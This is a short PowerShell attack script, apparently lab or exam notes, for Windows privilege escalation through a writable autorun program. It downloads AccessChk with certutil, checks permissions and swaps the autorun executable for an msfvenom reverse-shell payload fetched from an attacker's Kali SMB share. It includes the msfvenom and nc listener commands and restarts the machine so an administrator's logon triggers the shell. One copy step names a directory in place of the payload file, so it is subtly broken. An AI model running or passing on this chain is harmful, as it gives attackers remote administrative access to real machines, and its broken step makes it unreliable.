$kali_ip = x.x.x.x

# Download and unzipm AccessChk.exe to enumerate a specific directory for loose permissions
certutil  -urlcache -f https://download.sysinternals.com/files/AccessChk.zip C:\Users\Public\AccessChk.zip
Expand-Archive -Force C:\Users\Public\AccessChk.zip c:\Users\Public\

# Check for permissions (which should have been configured as weak)
C:\Users\Public\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# Check uswer permissions for shutdown capability (SeShutdownPrivilege)
whoami /priv

# backup autorun exe, grab reverse shell exe from kali box, overwrite autorun exe
# REMEMBER to start samba share on Kali first:
# 
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=888 -f exe -o /tmp/reverse.exe
# sudo python /usr/local/bin/smbserver.py tmp /tmp/
# once copied open a reverse shell listener: nc -nvlp 888

copy "C:\Program Files\Autorun Program\program.exe" c:\Temp\program.backup.exe
copy \\$kali_ip\tmp\reverse.exe c:\Users\Public\reverse.exe
copy c:\Users\Public\ "C:\Program Files\Autorun Program\program.exe"

# Get an admin to log in, then restart computer
Restart-Computer
